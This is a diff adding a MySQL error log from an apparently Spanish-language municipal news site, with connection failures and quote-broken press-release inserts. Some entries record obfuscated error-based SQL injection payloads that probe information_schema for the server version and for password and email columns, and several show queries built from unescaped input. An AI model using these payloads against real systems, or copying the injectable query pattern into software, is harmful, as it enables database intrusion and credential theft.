@@ -1,0 +1,129 @@
+Time : 19:36:18
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=
+
+Time : 18:12:23
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!0!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(t./**/tAbLe_nAmE),0x217e21) /**/fRoM information_schema./**/sChEmAtA as d join information_schema./**/tAbLeS as t on t./**/tAbLe_sChEmA = d./**/sChEmA_NaMe join information_schema./**/cOlUmNs as c on c./**/tAbLe_sChEmA = d./**/sChEmA_NaMe and c./**/tAbLe_nAmE = t./**/tAbLe_nAmE /**/wHeRe not c./**/tAbLe_sChEmA in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and c./**/cOlUmN_NaMe like 0x257061737325)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 18:12:20
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!0!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(t./**/tAbLe_nAmE),0x217e21) /**/fRoM information_schema./**/sChEmAtA as d join information_schema./**/tAbLeS as t on t./**/tAbLe_sChEmA = d./**/sChEmA_NaMe join information_schema./**/cOlUmNs as c on c./**/tAbLe_sChEmA = d./**/sChEmA_NaMe and c./**/tAbLe_nAmE = t./**/tAbLe_nAmE /**/wHeRe not c./**/tAbLe_sChEmA in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and c./**/cOlUmN_NaMe like 0x256d61696c25)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 18:12:16
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.7.25-log!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,/**/vErSiOn(),0x217e21)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 18:12:14
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.7.25-log!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,/**/vErSiOn(),0x217e21)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 15:47:10
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=
+
+Time : 14:59:22
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE opinion SET `visitas` = `visitas`+1 WHERE id=
+
+Time : 14:16:46
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=
+
+Time : 12:34:43
+SQLSTATE[HY000] [2002] Connection refused
+
+Time : 12:34:15
+SQLSTATE[HY000] [2002] Connection refused
+
+Time : 12:32:19
+SQLSTATE[HY000] [2002] Connection refused
+
+Time : 12:31:23
+SQLSTATE[HY000] [2002] Connection refused
+
+Time : 12:28:58
+SQLSTATE[HY000] [2002] Connection refused
+
+Time : 12:28:45
+SQLSTATE[HY000] [2002] Connection refused
+
+Time : 12:24:56
+SQLSTATE[HY000] [1040] Too many connections
+
+Time : 12:24:36
+SQLSTATE[HY000] [1040] Too many connections
+
+Time : 12:23:36
+SQLSTATE[HY000] [1040] Too many connections
+
+Time : 12:10:32
+SQLSTATE[HY000] [1040] Too many connections
+
+Time : 08:41:53
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'Rodar para volar'','rodar.jpg','Como parte de las actividades dentro de la campa' at line 1
+Raw SQL : CALL insertar('delicias','','titular5','Entrega Club Activo 20-30 silla de ruedas en su campaña 'Rodar para volar'','rodar.jpg','Como parte de las actividades dentro de la campaña "Rodar para volar" del Club Activo 2030, esta mañana hicimos entrega de silla de ruedas de para la señora Isabel Porras Lozano, expresó el socio del club y actual regidor en el Ayuntamiento de Delicias, Israel Obando Montes.','','Obando Montes estuvo presente en la rueda de prensa ofrecida por integrantes del club esta mañana a los medios y dijo que en su representación recibió la silla de ruedas su hija María Isabel Ramírez.
+
+
+Estuvieron presentes el Presidente del Club Activo 2030, Esteban Grajeola, Alejandro Beltrán, por mencionar algunos.','','Con esta silla de ruedas hemos entregado un total de 40 para diversas personas, agregó.
+
+Rodar para volar continuará haciendo entrega de este tipo de aparatos, como parte del compromiso de contribuir a la inclusión social en nuestra comunidad.
+','','Estuvieron presentes el Presidente del Club Activo 2030, Esteban Grajeola, Alejandro Beltrán, por mencionar algunos.','','','','')
+
+Time : 08:35:25
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'Arte en bici' ','arte.jpg','"Arte en bici” es un proyecto innovador realizado ' at line 1
+Raw SQL : CALL insertar('delicias','','titular5','Lanzan convocatoria de 'Arte en bici' ','arte.jpg','"Arte en bici” es un proyecto innovador realizado gracias al trabajo conjunto del Regidor de Juventud Emprendedora y Deporte, Luis Felipe Madrid Valles y de la Regidora de Arte, Cultura y Turismo, Lorena Galván Guerrero, así como de Presidencia Municipal, Universidad Vizcaya de las Américas y múltiples patrocinadores, cuyo objetivo es promover el arte y el deporte en el Municipio.','','Durante una rueda de prensa, en presencia del Alcalde Eliseo Compeán Fernández,  se dieron a conocer las bases de la convocatoria para participar en este proyecto en el que podrán participar artistas de diversos ámbitos, como diseñadores gráficos, arquitectos, aerógrafos, artistas urbanos, tatuadores, quienes podrán intervenir de manera libre las 16 bicicletas de montaña que se tienen contempladas y que posteriormente serán exhibidas en diversos puntos d ela ciudad y la región. 
+
+','','Las bases para participar en el proyecto son las siguientes: 
+
+-Residencia mínima de 3 años dentro de Delicias y la región. 
+
+-Presentar un boceto tamaño carta full color y en la descripción agregar las especificaciones técnicas.
+
+-Ser mayor de edad.
+
+-Presentar evidencia en portafolio de su último trabajo artístico. 
+
+La recepción de las propuestas será a partir de este día hasta el día 15 de noviembre en el Centro Cultural “Cleofas Villegas” en un horario de lunes a viernes de 9:00 de la mañana a 8:00 de la noche. 
+
+Habrá un Incentivo por la cantidad de mil pesos a cada uno de los artistas que pinten las 16 bicicletas.','','','','','','')
+
+Time : 08:31:11
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'Arte en bici ','arte.jpg','“Arte en bici” es un proyecto innovador realizado' at line 1
+Raw SQL : CALL insertar('delicias','','titular5','Lanzan convocatoria de 'Arte en bici ','arte.jpg','“Arte en bici” es un proyecto innovador realizado gracias al trabajo conjunto del Regidor de Juventud Emprendedora y Deporte, Luis Felipe Madrid Valles y de la Regidora de Arte, Cultura y Turismo, Lorena Galván Guerrero, así como de Presidencia Municipal, Universidad Vizcaya de las Américas y múltiples patrocinadores, cuyo objetivo es promover el arte y el deporte en el Municipio.','','Durante una rueda de prensa, en presencia del Alcalde Eliseo Compeán Fernández,  se dieron a conocer las bases de la convocatoria para participar en este proyecto en el que podrán participar artistas de diversos ámbitos, como diseñadores gráficos, arquitectos, aerógrafos, artistas urbanos, tatuadores, quienes podrán intervenir de manera libre las 16 bicicletas de montaña que se tienen contempladas y que posteriormente serán exhibidas en diversos puntos d ela ciudad y la región. 
+
+','','Las bases para participar en el proyecto son las siguientes: 
+
+-Residencia mínima de 3 años dentro de Delicias y la región. 
+
+-Presentar un boceto tamaño carta full color y en la descripción agregar las especificaciones técnicas.
+
+-Ser mayor de edad.
+
+
+Habrá un Incentivo por la cantidad de mil pesos a cada uno de los artistas que pinten las 16 bicicletas.','','-Presentar evidencia en portafolio de su último trabajo artístico. 
+
+La recepción de las propuestas será a partir de este día hasta el día 15 de noviembre en el Centro Cultural “Cleofas Villegas” en un horario de lunes a viernes de 9:00 de la mañana a 8:00 de la noche. 
+','','','','')
+
+Time : 08:30:02
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'Arte en bici' ','arte.jpg','“Arte en bici” es un proyecto innovador realizad' at line 1
+Raw SQL : CALL insertar('delicias','','titular5','Lanzan convocatoria de 'Arte en bici' ','arte.jpg','“Arte en bici” es un proyecto innovador realizado gracias al trabajo conjunto del Regidor de Juventud Emprendedora y Deporte, Luis Felipe Madrid Valles y de la Regidora de Arte, Cultura y Turismo, Lorena Galván Guerrero, así como de Presidencia Municipal, Universidad Vizcaya de las Américas y múltiples patrocinadores, cuyo objetivo es promover el arte y el deporte en el Municipio.','','Durante una rueda de prensa, en presencia del Alcalde Eliseo Compeán Fernández,  se dieron a conocer las bases de la convocatoria para participar en este proyecto en el que podrán participar artistas de diversos ámbitos, como diseñadores gráficos, arquitectos, aerógrafos, artistas urbanos, tatuadores, quienes podrán intervenir de manera libre las 16 bicicletas de montaña que se tienen contempladas y que posteriormente serán exhibidas en diversos puntos d ela ciudad y la región. 
+
+','','Las bases para participar en el proyecto son las siguientes: 
+
+-Residencia mínima de 3 años dentro de Delicias y la región. 
+
+-Presentar un boceto tamaño carta full color y en la descripción agregar las especificaciones técnicas.
+
+-Ser mayor de edad.
+
+
+Habrá un Incentivo por la cantidad de mil pesos a cada uno de los artistas que pinten las 16 bicicletas.','','-Presentar evidencia en portafolio de su último trabajo artístico. 
+
+La recepción de las propuestas será a partir de este día hasta el día 15 de noviembre en el Centro Cultural “Cleofas Villegas” en un horario de lunes a viernes de 9:00 de la mañana a 8:00 de la noche. 
+','','','','')
+
+Time : 01:04:19
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=
